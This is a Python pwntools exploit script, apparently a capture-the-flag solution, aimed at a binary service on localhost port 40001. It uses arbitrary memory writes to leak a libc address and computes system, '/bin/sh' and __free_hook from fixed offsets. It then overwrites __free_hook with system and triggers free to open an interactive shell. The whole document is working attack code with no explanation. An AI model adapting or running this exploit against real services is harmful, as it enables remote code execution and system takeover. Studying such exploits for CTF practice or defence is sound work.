from pwn import *
#works once every 7 times-ish :)
# p= process("./stripped_a.out")
p= remote("localhost",40001)
uu64    = lambda data               :u64(data.ljust(8, '\0'))
# pid= gdb.attach(p,gdbscript="""
#     b * 0x0000000000401466
#     b * free
# """)
    

def setup(p,name,idx,what,where):
    p.sendline("1")
    p.sendlineafter("> ",str(idx))
    p.sendlineafter("> ",str(name))
    p.sendlineafter("> ","99")
    p.sendlineafter("> ",str(int(where)))
    p.sendlineafter("> ",what)
    # p.sendlineafter("> ","AAAAAAAA")
    p.sendlineafter("> ","N")
    p.sendlineafter("> ","N")



def overwrite(p,name,idx,what,where):
    p.sendline("1")
    p.sendlineafter("> ",str(idx))
    p.sendlineafter("> ",str(name))
    p.sendlineafter("> ","99999999999999999")
    p.sendlineafter("> ",str(int(where)))
    p.sendlineafter("> ",p64(what))
    # p.sendlineafter("> ","AAAAAAAA")
    p.sendlineafter("> ","N")
    p.sendlineafter("> ","N")

setup(p,'hello_world',8,"/bin/sh\0",0)

overwrite(p,"test",0,0x602020,0x602090)
overwrite(p,"test2",1,0x0400730,0x602078)
p.sendlineafter("> ","42")
# count = 1 
# while(True):
#     print str(count) + " "+ p.recvline()
#     count+=1
for _ in range(12):
    p.recvline()
leak = uu64(p.recv(6))
print "this is a leak: "+hex(leak)
system = leak - 0x31550
bin_sh = leak + 0x13337a
free_hook = leak + 0x36ce48

print "system: "+ hex(system)
print "bin_sh: "+ hex(bin_sh)
print "free_hook: "+ hex(free_hook)

#overwrite(p,"test3",2,bin_sh,0x602088)
overwrite(p,"test4",3,system,free_hook)
p.sendlineafter("> ","3")
p.sendlineafter("> ","8")


p.interactive()
